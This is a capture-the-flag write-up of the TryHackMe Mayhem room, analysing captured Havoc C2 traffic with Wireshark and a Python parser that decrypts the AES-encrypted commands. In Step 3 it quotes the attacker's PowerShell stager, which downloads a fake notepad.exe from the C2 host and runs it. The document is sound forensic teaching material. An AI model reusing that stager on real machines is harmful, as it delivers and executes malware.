---
title: THM Mayhem 
tags: [Blue Team, C2]
description: Investigate traffic of a C2 connection
date: 2025-05-21
---
**Room Link:** https://tryhackme.com/room/mayhemroom
![Extract and download files - showing terminal with unzip command and file listing](/images/logo.png)

## Description

> Beneath the tempest's roar, a quiet grace,
> Mayhem's beauty in a hidden place.
> Within the chaos, a paradox unfolds,
> A tale of beauty, in disorder it molds.
>
> Click on the **Download Task Files** button at the top of this task. You will be provided with an **evidence.zip** file. Extract the zip file's contents and begin your analysis in order to answer the questions.
>
> **Note:** Some browsers may detect the file as malicious. The zip file is safe to download with md5 of `a7d64354e4b8798cff6e063449c1e64f`. In general, as a security practice, download the zip and analyze the forensic files on a dedicated virtual machine, and not on your host OS. Always handle such files in isolated, controlled, and secure environments.

---

## Understanding the Challenge - Simple Breakdown

**What is Mayhem?**
- You receive a zip file with network traffic captured from an infected computer
- Your job is to find what happened and answer 5 questions
- The attacker used a tool called **Havoc C2** to control the infected computer

**What you need to find:**
1. The attacker's user account ID (SID)
2. An IPv6 address used by the attacker
3. A username and password created for backdoor access
4. A file path that was accessed
5. A flag hidden in the files

---

## Step 1: Extract and Prepare Files

```bash
# Extract the evidence.zip file
unzip evidence.zip

# List all files to see what we're working with
ls -la

# You should see something like:
# - Network traffic capture (PCAP file)
# - Event logs or system artifacts
```

**What you'll find:**
- A file containing network traffic (usually named `final.pcapng` or similar)
- This shows all communication between the attacker's server and the infected computer

---

## Step 2: Open Network Traffic in Wireshark

```bash
# Open the PCAP file with Wireshark
wireshark final.pcapng &
```

**What to look for:**

1. **Two main IP addresses:** 10.0.2.37 and 10.0.2.38
   - 10.0.2.37 = Attacker's Command & Control Server
   - 10.0.2.38 = Infected Computer (victim)

2. **Three HTTP file transfers** appear in the traffic:
   - `install.ps1` - PowerShell script
   - `notepad.exe` - Malware (disguised as Windows notepad)
   - Another executable file

---

## Step 3: Extract Downloaded Files

In Wireshark:
1. Click menu: **File → Export Objects → HTTP**
2. You'll see 3 files listed
3. Save all of them to analyze

**The PowerShell Script (install.ps1):**

```powershell
$aysXS8Hlhf = "http://10.0.2.37:1337/notepad.exe"
$LA4rJgSPpx = "C:\Users\paco\Downloads\notepad.exe"
Invoke-WebRequest -Uri $aysXS8Hlhf -OutFile $LA4rJgSPpx
$65lmAtnzW8 = New-Object System.Net.WebClient
$65lmAtnzW8.DownloadFile($aysXS8Hlhf, $LA4rJgSPpx)
Start-Process -Filepath $LA4rJgSPpx
```

**What it does (in simple terms):**
- Downloads `notepad.exe` from the attacker's server
- Saves it to the victim's Downloads folder
- Runs the downloaded file
- This launches the malware!

---

## Step 4: Identify the Malware

Check the MD5 hash of the `notepad.exe` file:

```bash
md5sum notepad.exe
# Output: a13daa35fd7b873f87379a94b97168e2
```

Search this hash on **VirusTotal.com** and you'll find:
- It's flagged as **Havoc C2 malware** by most antivirus engines
- Havoc is a command & control framework
- The attacker can now send commands to the infected computer!

---

## Step 5: Decrypt the Secret Communication

After the malware runs, the attacker and malware communicate using **encrypted traffic**. To read these messages, we need to:

1. **Find the encryption key** (AES key and IV)
2. **Decrypt the messages**
3. **Read what commands were executed**

### The Python Script (Copy and Use This)

Save this as `havoc-parser.py`:

```python
import os
import argparse
import struct
import binascii
from binascii import unhexlify
from uuid import uuid4

try:
    import pyshark
except ImportError:
    print("[-] Pyshark not installed, please install with 'pip install pyshark'")
    exit(0)

try:
    from Crypto.Cipher import AES
    from Crypto.Util import Counter
except ImportError:
    print("[-] PyCryptodome not installed, please install with 'pip install pycryptodome'")
    exit(0)

RED = '\033[91m'
GREEN = '\033[92m'
BLUE = '\033[94m'
RESET = '\033[0m'

demon_constants = {
    1: "GET_JOB",
    10: 'COMMAND_NOJOB',
    11: 'SLEEP',
    12: 'COMMAND_PROC_LIST',
    15: 'COMMAND_FS',
    20: 'COMMAND_INLINEEXECUTE',
    21: 'COMMAND_JOB',
    22: 'COMMAND_INJECT_DLL',
    24: 'COMMAND_INJECT_SHELLCODE',
    26: 'COMMAND_SPAWNDLL',
    27: 'COMMAND_PROC_PPIDSPOOF',
    40: 'COMMAND_TOKEN',
    99: 'DEMON_INIT',
    100: 'COMMAND_CHECKIN',
    2100: 'COMMAND_NET',
    2500: 'COMMAND_CONFIG',
    2510: 'COMMAND_SCREENSHOT',
    2520: 'COMMAND_PIVOT',
    2530: 'COMMAND_TRANSFER',
    2540: 'COMMAND_SOCKET',
    2550: 'COMMAND_KERBEROS',
    2560: 'COMMAND_MEM_FILE',
    4112: 'COMMAND_PROC',
    4113: 'COMMMAND_PS_IMPORT',
    8193: 'COMMAND_ASSEMBLY_INLINE_EXECUTE',
    8195: 'COMMAND_ASSEMBLY_LIST_VERSIONS',
}

sessions = {}

def tsharkbody_to_bytes(hex_string):
    """Convert hex string to bytes"""
    hex_string = hex_string.replace(':', '')
    hex_bytes = unhexlify(hex_string)
    return hex_bytes

def aes_decrypt_ctr(aes_key, aes_iv, encrypted_payload):
    """Decrypt AES-CTR encrypted data"""
    ctr = Counter.new(128, initial_value=int.from_bytes(aes_iv, byteorder='big'))
    cipher = AES.new(aes_key, AES.MODE_CTR, counter=ctr)
    decrypted_payload = cipher.decrypt(encrypted_payload)
    return decrypted_payload

def parse_header(header_bytes):
    """Parse the 20-byte Havoc header"""
    if len(header_bytes) != 20:
        raise ValueError("Header must be exactly 20 bytes long")

    payload_size, magic_bytes, agent_id, command_id, mem_id = struct.unpack('>I4s4sI4s', header_bytes)
    magic_bytes_str = binascii.hexlify(magic_bytes).decode('ascii')
    agent_id_str = binascii.hexlify(agent_id).decode('ascii')
    mem_id_str = binascii.hexlify(mem_id).decode('ascii')
    command_name = demon_constants.get(command_id, f'Unknown Command ID: {command_id}')

    return {
        'payload_size': payload_size,
        'magic_bytes': magic_bytes_str,
        'agent_id': agent_id_str,
        'command_id': command_name,
        'mem_id': mem_id_str
    }

def parse_request(http_pair, magic_bytes):
    request = http_pair['request']
    response = http_pair['response']
    unique_id = uuid4()

    try:
        request_body = tsharkbody_to_bytes(request.get('file_data', ''))
        header_bytes = request_body[:20]
        request_payload = request_body[20:]
        request_header = parse_header(header_bytes)
    except Exception as e:
        print(f"[!] Error parsing request body: {e}")
        return

    if request_header.get("magic_bytes", '') != magic_bytes:
        return

    if request_header['command_id'] == 'DEMON_INIT':
        print("[+] Found Havoc C2")
        print(f"  [-] Agent ID: {request_header['agent_id']}")
        print(f"  [-] Magic Bytes: {request_header['magic_bytes']}")
        print(f"  [-] C2 Address: {request.get('uri')}")

        aes_key = request_body[20:52]
        aes_iv = request_body[52:68]

        print(f"  [+] Found AES Key")
        print(f"    [-] Key: {binascii.hexlify(aes_key).decode('ascii')}")
        print(f"    [-] IV: {binascii.hexlify(aes_iv).decode('ascii')}")

        if request_header['agent_id'] not in sessions:
            sessions[request_header['agent_id']] = {
                "aes_key": aes_key,
                "aes_iv": aes_iv
            }
        
        response_payload = None
        request_payload = None

    elif request_header['command_id'] == 'GET_JOB':
        print("  [+] Job Request from Server to Agent")
        
        try:
            response_body = tsharkbody_to_bytes(response.get('file_data', ''))
        except Exception as e:
            print(f"[!] Error parsing request body: {e}")
            return

        header_bytes = response_body[:12]
        response_payload = response_body[12:]
        command_id = struct.unpack('<H', header_bytes[:2])[0]
        command = demon_constants.get(command_id, f'Unknown Command ID: {command_id}')

        print(f"    [-] C2 Address: {request.get('uri')}")
        print(f"    [-] Command: {command}")

    else:
        print(f"  [+] Unknown Command: {request_header['command_id']}")

    aes_keys = sessions.get(request_header['agent_id'], None)

    if not aes_keys:
        print(f"[!] No AES Keys for Agent with ID {request_header['agent_id']}")
        return
    
    request_payload_res = None
    response_payload_res = None

    # Decrypt the Request Body
    if request_payload:
        print("  [+] Decrypting Request Body")
        decrypted_request = aes_decrypt_ctr(aes_keys['aes_key'], aes_keys['aes_iv'], request_payload)
        request_payload_res = decrypted_request[16:-16].decode('ascii', 'ignore')
        print("="*46+" Result "+"="*46)
        print(request_payload_res)
        print("="*100)

    # Decrypt the Response Body
    if response_payload:
        print("  [+] Decrypting Response Body")
        decrytped_response = aes_decrypt_ctr(aes_keys['aes_key'], aes_keys['aes_iv'], response_payload)[12:]
        response_payload_res = decrytped_response.decode('utf-16le','ignore').split("/c")[1][:-4]
        print(f"    [-] Command: {GREEN}{response_payload_res}{RESET}")
    
    return [request_payload_res, response_payload_res]

def read_pcap_and_get_http_pairs(pcap_file, magic_bytes, save):
    capture = pyshark.FileCapture(pcap_file, display_filter='http')
    result = []
    http_pairs = {}
    current_stream = None
    request_data = None

    print("[+] Parsing Packets")

    for packet in capture:
        try:
            if current_stream != packet.tcp.stream:
                current_stream = packet.tcp.stream
                request_data = None

            if packet:
                if hasattr(packet.http, 'request_method'):
                    request_data = {
                        'method': packet.http.request_method,
                        'uri': packet.http.request_full_uri,
                        'headers': packet.http.get_field_value('request_line'),
                        'file_data': packet.http.file_data if hasattr(packet.http, 'file_data') else None
                    }
                elif hasattr(packet.http, 'response_code'):
                    response_data = {
                        'code': packet.http.response_code,
                        'phrase': packet.http.response_phrase,
                        'headers': packet.http.get_field_value('response_line'),
                        'file_data': packet.http.file_data if hasattr(packet.http, 'file_data') else None
                    }
                    http_pairs[f"{current_stream}_{packet.http.request_in}"] = {
                        'request': request_data,
                        'response': response_data
                    }
                    response_data['file_data'] = packet.tcp.payload.replace(':', '').split("0d0a0d0a")[1]
                    
                    result += parse_request(http_pairs[f"{current_stream}_{packet.http.request_in}"], magic_bytes)
                    request_data = None

        except Exception as e:
            pass

    if save:
        with open(save, 'w') as f:
            f.write("Output: \n")
            for l in result:
                if l:
                    data = l.replace('\x00', '')
                    f.write(f"{data}\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Extract Havoc Traffic from a PCAP')

    parser.add_argument('--pcap', help='Path to pcap file', required=True)
    parser.add_argument("--aes-key", help="AES key", required=False)
    parser.add_argument("--aes-iv", help="AES initialization vector", required=False)
    parser.add_argument("--agent-id", help="Agent ID", required=False)
    parser.add_argument('--magic', help='Set the magic bytes marker for the Havoc C2 traffic', default='deadbeef', required=False)
    parser.add_argument('--to-file', help='Save conversation to file', default=False, required=False)

    args = parser.parse_args()

    if any([args.aes_key, args.aes_iv, args.agent_id]) and not all([args.aes_key, args.aes_iv, args.agent_id]):
        parser.error("[!] If you provide one of 'aes-key', 'aes-iv', or 'agent-id', you must provide all three.")
    
    if args.agent_id and args.aes_key and args.aes_iv:
        sessions[args.agent_id] = {
            "aes_key": unhexlify(args.aes_key),
            "aes_iv": unhexlify(args.aes_iv)
        }
        print(f"[+] Added session keys for Agent ID {args.agent_id}")

    http_pairs = read_pcap_and_get_http_pairs(args.pcap, args.magic, args.to_file)
```

### How to Use the Script

First, install required tools:

```bash
# Install Python libraries
pip3 install pyshark pycryptodome

# If on Linux, install tshark
sudo apt install tshark
```

Run the script:

```bash
python3 havoc-parser.py --pcap final.pcapng --to-file commands.txt
```

**The script will output:**
- Agent ID
- Magic Bytes (`deadbeef`)
- AES encryption key
- AES IV (initialization vector)
- **All decrypted commands sent to the malware!**

---

## Step 6: Find the Answers

### Question 1: SID of the Attacker's User Account

**Where to find it:** In the decrypted commands output or Windows Event Logs

The SID looks like: `S-1-5-21-...`

Look for command outputs that show user account information.

### Question 2: Link-Local IPv6 Address

**Where to find it:** In the network traffic or from the malware's configuration

IPv6 Link-Local addresses start with: `fe80::`

Look for IPv6 addresses in the traffic or in network configuration commands.

### Question 3: New Account Created (Username and Password)

**Where to find it:** In the decrypted commands

Look for PowerShell commands like:
```powershell
New-LocalUser -Name "username" -Password "password"
```

### Question 4: Important File Path

**Where to find it:** In file system commands within the traffic

Look for paths like `C:\Users\...` or file operations in the decrypted output.

### Question 5: Flag

**Where to find it:** Inside the file from Question 4 or in the memory/artifacts

The flag is usually in format: `flag{...}`

---

## Quick Command Reference

```bash
# View network traffic with Wireshark
wireshark final.pcapng

# Extract files from PCAP
# (In Wireshark: File → Export Objects → HTTP)

# Check file hash
md5sum notepad.exe

# Run the decryption script
python3 havoc-parser.py --pcap final.pcapng --to-file output.txt

# View decrypted commands
cat output.txt
```

---

## Key Concepts

**Havoc C2:** A tool attackers use to control infected computers remotely (like a backdoor)

**AES Encryption:** The cipher used to hide commands from security analysts

**Magic Bytes (0xDEADBEEF):** A signature that identifies Havoc traffic

**PCAP:** A file containing captured network traffic

**Decryption:** Using the AES key and IV to read encrypted messages

---

